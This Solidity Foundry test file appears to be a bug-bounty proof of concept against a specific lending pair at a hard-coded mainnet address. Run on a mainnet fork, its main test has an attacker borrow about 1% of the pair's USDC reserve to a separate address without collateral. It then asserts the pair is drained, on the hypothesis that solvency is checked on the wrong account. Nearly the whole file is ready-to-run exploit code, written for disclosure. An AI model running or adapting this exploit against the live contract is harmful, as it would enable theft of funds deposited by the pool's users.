// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IAmmalgamPair {
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function borrowLiquidity(address to, uint256 borrowAmountLAssets, bytes calldata data)
        external
        returns (uint256, uint256);
    function tokens(uint256 tokenType) external view returns (address);
    function underlyingTokens() external view returns (address, address);
    function getReserves() external view returns (uint112, uint112, uint32);
}

/// @dev Cantina-style mainnet-fork PoC: borrow(to != msg.sender) may skip solvency on the debt holder.
contract BorrowToBypassTest is Test {
    address constant PAIR = 0x728fD0A966B993fe518B00122D51e494F99aBd6a;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IAmmalgamPair pair = IAmmalgamPair(PAIR);

    function setUp() public {
        vm.createSelectFork("mainnet");
    }

    /// @notice Attacker borrows to a fresh address; solvency is checked on msg.sender (no debt).
    function test_borrowToDifferentAddress_skipsSolvencyOnDebtHolder() public {
        address attacker = makeAddr("attacker");
        address debtSink = makeAddr("debtSink");

        (uint112 reserveX,,) = pair.getReserves();
        // Borrow a modest amount of USDC (token X) well under 90% utilization headroom.
        uint256 borrowAmount = uint256(reserveX) / 100; // 1% of reserve
        require(borrowAmount > 0, "empty reserve");

        uint256 usdcBefore = IERC20(USDC).balanceOf(debtSink);
        uint256 pairUsdcBefore = IERC20(USDC).balanceOf(PAIR);

        address borrowX = pair.tokens(4); // BORROW_X
        uint256 debtBefore = IERC20(borrowX).balanceOf(debtSink);

        console2.log("reserveX (USDC raw)", reserveX);
        console2.log("borrowAmount", borrowAmount);
        console2.log("pair USDC before", pairUsdcBefore);

        vm.prank(attacker);
        // Empty data => no callback. Debt minted to debtSink; assets sent to debtSink.
        // validateSolvency(attacker) should see no debt on attacker and skip LTV.
        pair.borrow(debtSink, borrowAmount, 0, "");

        uint256 usdcAfter = IERC20(USDC).balanceOf(debtSink);
        uint256 pairUsdcAfter = IERC20(USDC).balanceOf(PAIR);
        uint256 debtAfter = IERC20(borrowX).balanceOf(debtSink);
        uint256 attackerDebt = IERC20(borrowX).balanceOf(attacker);

        console2.log("debtSink USDC gained", usdcAfter - usdcBefore);
        console2.log("pair USDC lost", pairUsdcBefore - pairUsdcAfter);
        console2.log("debtSink BORROW_X shares", debtAfter - debtBefore);
        console2.log("attacker BORROW_X shares", attackerDebt);

        // If vulnerable: debtSink received USDC and holds the debt; attacker holds none.
        assertGt(usdcAfter, usdcBefore, "debtSink should receive borrowed USDC");
        assertEq(usdcAfter - usdcBefore, borrowAmount, "full borrow amount to debtSink");
        assertGt(debtAfter, debtBefore, "debt should sit on debtSink");
        assertEq(attackerDebt, 0, "attacker should not hold debt");
        assertEq(pairUsdcBefore - pairUsdcAfter, borrowAmount, "pair drained by borrowAmount");
    }

    /// @notice Control: borrowing to self with no collateral must revert.
    function test_borrowToSelf_withoutCollateral_reverts() public {
        address attacker = makeAddr("attackerSelf");
        (uint112 reserveX,,) = pair.getReserves();
        uint256 borrowAmount = uint256(reserveX) / 100;

        vm.prank(attacker);
        vm.expectRevert();
        pair.borrow(attacker, borrowAmount, 0, "");
    }
}
